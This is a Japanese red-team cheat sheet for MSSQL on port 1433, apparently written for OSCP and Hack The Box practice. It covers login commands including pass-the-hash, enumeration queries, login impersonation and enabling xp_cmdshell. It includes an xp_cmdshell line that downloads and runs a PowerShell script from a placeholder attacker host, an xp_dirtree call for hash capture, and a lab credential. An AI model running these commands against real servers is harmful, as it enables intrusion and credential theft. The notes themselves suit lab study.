---
title: 1433 MSSQL
parent: Services
grand_parent: Red Team
nav_order: 1433
---
# MSSQL

---

## Default Port

- 1433

---

## Service Info



---
## Common security issues



---
# Access

# MSSQL ログイン方法まとめ

## Windows

### SQL認証

```powershell
sqlcmd -S 192.168.1.10 -U sa -P Password123!
```

または

```powershell
sqlcmd -S servername\SQLEXPRESS -U username -P password
```

---

### Windows認証（統合認証）

```powershell
sqlcmd -S servername -E
```

- `-E` : 現在ログイン中のWindowsユーザーで認証

---

## Linux

### sqlcmd

```bash
sqlcmd -S 192.168.1.10 -U sa -P 'Password123!'
```

接続確認

```sql
SELECT @@VERSION;
GO
```

---

### Impacket mssqlclient

#### SQL認証

```bash
impacket-mssqlclient sa:Password123!@192.168.1.10
```

#### Windows認証

```bash
impacket-mssqlclient domain/user:Password123!@192.168.1.10
```

#### Pass-the-Hash

```bash
impacket-mssqlclient -hashes :NTHASH domain/user@192.168.1.10
```

---

## GUI接続

### SQL Server Management Studio (SSMS)

接続時に指定する項目

- Server Name
- Authentication
  - Windows Authentication
  - SQL Server Authentication
- Username
- Password

---

# 接続後の基本確認

*SQLのあとにgoすると実行される。goまでは複数行入力可*
## 現在のログインユーザー

```sql
SELECT SYSTEM_USER;
go
```

---

## sysadmin権限の確認

```sql
SELECT IS_SRVROLEMEMBER('sysadmin');
go
```

出力:

|値|意味|
|---|---|
|1|sysadmin|
|0|非sysadmin|
|NULL|確認不可|

---

## SQL Serverバージョン確認

```sql
SELECT @@VERSION;
go
```

---

## ホスト名確認

```sql
SELECT @@SERVERNAME;
go
```

---

## データベース一覧

```sql
SELECT name FROM sys.databases;
go
```

---

## 現在のデータベース

```sql
SELECT DB_NAME();
go
```

---

## テーブル一覧

```sql
SELECT name FROM sys.tables;
GO
```

or

```sql
SELECT TABLE_SCHEMA, TABLE_NAME
FROM INFORMATION_SCHEMA.TABLES
WHERE TABLE_TYPE = 'BASE TABLE';
GO
```

or

```sql
SELECT name
FROM sys.objects
WHERE type = 'U';
GO
```
U は USER_TABLE（ユーザーテーブル）

or

```sql
SELECT
    SCHEMA_NAME(schema_id) AS schema_name,
    name AS table_name
FROM sys.objects
WHERE type = 'U';
GO
```

---

## 現在のデータベース

```sql
SELECT DB_NAME();
go
```

## 現在の権限確認

```sql
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
```

---

# よく使う列挙コマンド

## ログインユーザー一覧

```sql
SELECT name
FROM sys.sql_logins;
```

---

## サーバーロール確認

```sql
SELECT
    sp.name AS LoginName,
    sr.name AS ServerRole
FROM sys.server_role_members rm
JOIN sys.server_principals sp
    ON rm.member_principal_id = sp.principal_id
JOIN sys.server_principals sr
    ON rm.role_principal_id = sr.principal_id;
```

---

## リンクサーバー確認

```sql
EXEC sp_linkedservers;
```

---

## xp_cmdshell有効確認

```sql
EXEC sp_configure 'xp_cmdshell';
```

---

## 高度な設定確認

```sql
EXEC sp_configure 'show advanced options';
```

---

# OSCP/HTBで最初に確認する項目

```sql
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT @@SERVERNAME;
SELECT @@VERSION;
```

この4つで以下を把握できる。

- 誰でログインしているか
- sysadminか
- サーバー名
- SQL Serverのバージョン

# Login

## Kali

```bash
impacket-mssqlclient Administrator:Password@192.168.50.18 -windows-auth
```
- -windows-auth Specifies logging in using Windows authentication mode


-windows-auth の意味

● Windows 認証モードでログインする指定

SQL Server には2種類の認証があります：

モード	内容
1. SQL Authentication	SQL独自ユーザー（saなど）

2. Windows Authentication	AD / NTLM / Kerberos
● -windows-auth を付けると：
NTLM認証（またはKerberos）でログイン
Windowsアカウントとして認証される
ドメイン環境で特に重要

## Windows
## sqlcmd
```bash
sqlcmd -S 192.168.1.10 -U sa -P password
```
- -S
- -U username
- sa MSSQLSystemAdmin (same MySQL root)

## DB情報の取得
```zsh
# DBとOSのバージョン
select @@version;

# DBのリスト
select name from sys.databases;
```

```zsh
SELECT * FROM master..sysdatabases;

SELECT name FROM master..sysdatabases;
# master,tempdb,model,msdbはデフォルトDB
```

## Checking permissions
```zsh
enum_impersonate
```

## Switching users
```bash
execute as login = 'appdev'
```

## List Databases
```zsh
select name from sys.databases;
```

## Use a Database
```zsh
use financial_planner;
```

```zsh
use hrappdb
```

## List Tables
```zsh
select * from financial_planner.INFORMATION_SCHEMA.TABLES;
```

```zsh
SELECT  *  FROM hrappdb.INFORMATION_SCHEMA.TABLES;
```

```
SELECT * FROM offsec.information_shema.tables;
```

```
select name from sysobjects where xtype = 'U'
```

## Colmns Information
```
EXEC sp_columns users;
```

## Check Data

```zsh
select * from users;
```

```zsh
select * from sysauth;
```

# ユーザの偽装
アクセスしたいデータベースに以下のように権限がない場合
```zsh
use fugadb

ERROR: Line 1: The server principal "HAERO\discovery" is not able to access the database "fugadb" under the current security context.
```

## 偽装可能なユーザの確認
```zsh
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
```


---
## [xp_cmdshell](docs/02_Red/99_attack_repo/251-300_win-mis/255_xp-cmdshell_change-user)


### Enable (sysadmin privileges required)

```powershell
SQL (zeus\db_user  guest@msdb)> 
```

```
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
```

```
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

### Exec OS Command

```powershell
EXEC xp_cmdshell 'whoami';
```

```powershell
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(\'http://attacker/shell.ps1\')"';
```

```powershell
exec xp_dirtree '\\192.168.45.186\test';
```

---

# Example

# HTB_Eighteen
## Login
```zsh
impacket-mssqlclient kevin:'iNa2we6haRj2gaw!'@eighteen.htb
```

## 権限の確認
```zsh
enum_impersonate
```

## ユーザの切り替え
```zsh
execute as login = 'appdev'
```

## DBの一覧表示
```zsh
select name from sys.databases;
```

## DBの使用
```zsh
use financial_planner;
```

## テーブルの一覧表示
```zsh
select * from financial_planner.INFORMATION_SCHEMA.TABLES;
```

## データの確認
```zsh
select * from users;
```

---
# Reverse Shell

👉 Try:

* 

---

# No Credentials?

👉 Try:

* Password spraying → [Password Attacks](../03_initial_access/password_attacks.md)
* Check reused creds from other services

---

## 8. Lateral Movement / Pivot

👉 Reuse credentials:

* Other hosts via WinRM
* SMB / RDP
- [ligolo](../06_pivot_tunneling/ligolo.md)
- [chisel](../06_pivot_tunneling/chisel.md)
- [ssh-tunnel](../06_pivot_tunneling/ssh_tunnel.md)

---

👉 If shell obtained:

→ [Windows Privilege Escalation](../04_privesc/windows.md)
